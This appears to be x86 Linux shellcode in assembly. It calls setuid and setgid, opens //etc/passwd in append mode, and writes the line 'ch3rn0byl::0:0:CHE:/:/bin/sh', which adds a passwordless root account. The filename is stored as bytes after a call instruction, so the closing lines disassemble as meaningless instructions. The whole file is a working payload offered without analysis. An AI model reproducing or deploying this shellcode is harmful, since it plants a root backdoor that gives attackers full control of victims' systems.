global _start

section .text
_start:
	mov al, 0x17            ; sys_setuid
	int 0x80                ; Interruption

	mov al, 0x2e            ; sys_setgid
	int 0x80	            ; Interruption
	jmp short starter

pwn:
	pop ebx                 ; //etc/passwd
	mov byte al, 0x5        ; sys_open
	mov word cx, 0x401      ; Append mode
	int 0x80                ; Interruption
	mov ebx, eax

	push edx
	push 0x68732f6e         ; hs/n
	push 0x69622f3a         ; ib/:
	push 0x2f3a4548         ; /:EH
	push 0x433a303a         ; C:0:
	push 0x303a3a6c         ; 0::l
	push 0x7962306e         ; yb0n
	push 0x72336863         ; r3hc
	mov ecx, esp            ; ch3rn0byl::0:0:CHE:/:/bin/sh\n
    mov al, 0x4             ; sys_write
    mov dl, 0x1c            ; len = 28 = 0x1c
    int 0x80                ; Interruption

    inc al                  ; sys_close
    inc al
    int 0x80                ; Interruption

    xor eax, eax
    mov al, 0x1             ; sys_exit
    int 0x80                ; Interruption


starter:
	call pwn
	das
	das
	gs je short 0x64
	das
	jo short 0x62
	jae short 0x74
	ja short 0x65
